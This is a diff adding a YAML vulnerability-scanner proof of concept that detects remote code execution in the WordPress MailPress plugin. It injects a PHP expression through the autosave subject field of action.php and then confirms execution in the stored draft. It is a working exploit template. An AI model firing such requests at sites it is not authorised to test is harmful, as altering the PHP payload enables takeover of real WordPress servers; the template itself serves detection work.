@@ -1,0 +1,23 @@
+name: poc-yaml-wordpress-ext-mailpress-rce
+set:
+  r: randomInt(800000000, 1000000000)
+  r1: randomInt(800000000, 1000000000)
+rules:
+  - method: POST
+    path: "/wp-content/plugins/mailpress/mp-includes/action.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}%2b{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+    expression: "true"
+    search: |
+      <autosave id='(?P<id>.+?)'
+  - method: GET
+    path: "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}}"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r + r1)))
+
+detail:
+  author: violin
+  links:
+    - https://github.com/Medicean/VulApps/tree/master/w/wordpress/2
